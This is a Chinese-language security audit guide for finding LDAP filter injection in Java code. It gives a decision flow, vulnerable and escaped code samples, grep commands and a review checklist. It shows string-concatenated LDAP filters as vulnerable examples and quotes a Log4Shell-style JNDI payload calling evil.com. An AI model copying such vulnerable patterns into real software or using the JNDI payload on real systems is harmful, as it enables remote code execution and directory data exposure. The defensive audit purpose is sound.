# LDAP 注入

## 0. 黄金法则

> **漏洞存在性判断 优先于 防护有效性判断**
>
> Filter 不拼接用户输入 = 无 LDAP 注入（这是漏洞本质判断，不是防护有效判断）
>
> 满足此条件时：立即终止分析，无需检查任何防护措施。

**重要区分**：JNDI LDAP 协议注入（如 Log4Shell `${jndi:ldap://evil.com/exp}`）属于 RCE，参见 [java-rce.md](java-rce.md)。本文件仅处理 LDAP 目录查询 Filter 拼接注入。

---

## 1. 结论判断标准

| 结论 | 定义 | 判定条件 |
|------|------|----------|
| **漏洞** | 用户输入到达 LDAP Filter 拼接点，无有效防护 | Filter 拼接用户输入 + HTTP 入口 + 无转义/白名单 |
| **风险-A** | Filter 拼接但无 HTTP 入口可达 | 危险拼接 + 无外部入口 |
| **风险-B** | 有入口但防护不充分 | 仅过滤部分特殊字符 |
| **安全** | Filter 不含用户输入拼接，或有充分防护 | 值绑定 / LdapEncoder.filterEncode / 白名单 / 类型约束 |

---

## 2. 研判思路

### 2.1 LDAP 操作类型（第一优先级）

| 操作类型 | 特征 | 本文件覆盖 |
|---------|------|-----------|
| Filter 搜索 | `DirContext.search(dn, filter, ...)` / `LdapTemplate.search()` | 是 |
| DN 构造 | `new LdapName(dn)` | 是（DN 注入） |
| JNDI LDAP 协议 | `InitialContext.lookup("ldap://...")` | 否 → java-rce.md |
| LDAP bind 认证 | `ctx.addToEnvironment(SECURITY_CREDENTIALS, pwd)` | 否 |

### 2.2 研判流程

```
Step 1: 类型约束检查 【终止点】
  ├─ int/long/Integer/Long / 枚举 / Integer.parseInt()？ → 安全（终止）
  └─ String 类型 → 继续

Step 2: Filter 拼接检查 【终止点】
  ├─ Filter 硬编码，输入仅作为 SearchControls 参数？ → 安全（终止）
  └─ 用户输入直接拼接到 Filter 字符串 → 继续

Step 3: 防护措施检查
  ├─ LdapEncoder.filterEncode() / encodeForLDAP()？ → 安全（终止）
  ├─ Spring LdapUtils.escapeNameForFilter()？ → 安全（终止）
  ├─ 严格字母数字白名单？ → 安全（终止）
  ├─ 仅过滤部分字符（如仅过滤 * 未过滤 )( ）？ → 风险-B
  └─ 无防护 → 漏洞
```

### 2.3 降级条件表

| 条件 | 原结论 | 降级后 |
|------|--------|--------|
| 类型约束（int/long/Enum） | 漏洞 | 安全 |
| Filter 硬编码 | 漏洞 | 安全 |
| LdapEncoder.filterEncode / encodeForLDAP | 漏洞 | 安全 |
| 严格白名单 | 漏洞 | 安全 |
| 仅过滤部分字符 | 漏洞 | 风险-B |
| 无 HTTP 入口 | 漏洞 | 风险-A |

---

## 3. 常见漏洞/风险场景

### 漏洞

```java
// Filter 拼接用户输入
String filter = "(uid=" + username + ")";
ctx.search(baseDn, filter, controls);  // 漏洞

// DN 构造拼接用户输入
String dn = "uid=" + username + ",ou=users,dc=example,dc=com";
ctx.search(dn, "(objectClass=*)", controls);  // 漏洞（DN 注入）
```

### 风险-B

```java
// 仅过滤 * 号
String safe = input.replace("*", "");
String filter = "(uid=" + safe + ")";  // 风险-B：未过滤 )( 等
```

---

## 4. 常见防御模式

### LDAP 编码

```java
String safe = LdapEncoder.filterEncode(userInput);  // 安全
String filter = "(uid=" + safe + ")";

String safe = LdapUtils.escapeNameForFilter(userInput);  // 安全
```

### 白名单 / 类型约束

```java
if (!input.matches("^[a-zA-Z0-9_-]+$")) throw ...;  // 安全
Long id = Long.parseLong(input);  // 安全
```

---

## 5. 检索技巧

### 搜索关键词

| 类型 | 关键词 |
|------|--------|
| LDAP 操作 | `DirContext.search`, `LdapTemplate.search`, `LdapName` |
| Filter 构造 | `filter =`, `filter+=`, `(uid=`, `(cn=` |
| 编码函数 | `LdapEncoder.filterEncode`, `encodeForLDAP`, `escapeNameForFilter` |

### 检测命令

```bash
grep -rn "DirContext.search\|LdapTemplate.search" --include="*.java"
grep -rn "filterEncode\|encodeForLDAP\|escapeNameForFilter" --include="*.java"
```

---

## 6. 常见误判场景

### 陷阱1：JNDI LDAP 协议混淆

**错误**: 看到 `ldap://` 就认为是 LDAP 注入
**正确**: `InitialContext.lookup("ldap://...")` 属于 RCE（JNDI 注入），参见 java-rce.md

### 陷阱2：SearchControls 参数误判

**错误**: 看到 search 调用就认为漏洞
**正确**: Filter 为硬编码，输入仅作为 SearchControls 参数 → 安全

### 陷阱3：类型约束忽略

**错误**: 看到 String filter 就认为漏洞
**正确**: 若输入经过 `Integer.parseInt()` 转换 → 安全

---

## 7. 特殊风险

### LDAP Filter 特殊字符

| 字符 | 含义 | 转义方式 |
|------|------|----------|
| `*` | 通配符 | `\2a` |
| `(` | 过滤器开始 | `\28` |
| `)` | 过滤器结束 | `\29` |
| `\` | 转义字符 | `\5c` |
| `NUL` | 空字节 | `\00` |
| `/` | DN 分隔符 | `\2f` |

使用 `LdapEncoder.filterEncode(input)` 可自动转义所有特殊字符。

### LDAP Filter 注入 vs JNDI LDAP 协议注入

LDAP Filter 注入（本文件范围）：拼接用户输入到 LDAP 搜索过滤器，导致信息泄露/认证绕过。JNDI LDAP 协议注入（参见 java-rce.md）：`InitialContext.lookup("ldap://evil.com/...")` 触发远程类加载 RCE。两者 Sink 点和利用方式完全不同。

---

## 8. 变更影响分析

| 变更类型 | 变更内容 | 风险 |
|----------|----------|------|
| 新增 | 新增 LDAP Filter 拼接 | 确认用户可控性 |
| 修改 | 移除 LdapEncoder 编码 | 引入漏洞 |
| 修改 | 从值绑定改为字符串拼接 | 引入漏洞 |

---

## 9. 质量门禁（强制执行）

在输出审计结论前，按顺序验证：

- [ ] 操作类型已正确区分（Filter 搜索 vs JNDI 协议）
- [ ] 类型约束已检查
- [ ] Filter 拼接方式已确认
- [ ] 编码函数完整性已确认
- [ ] HTTP 入口可达性已确认
- [ ] 结论与证据一致，代码行号可追溯

**上一项未通过，禁止进入下一项。最终检查未通过，禁止宣布审计完成。**
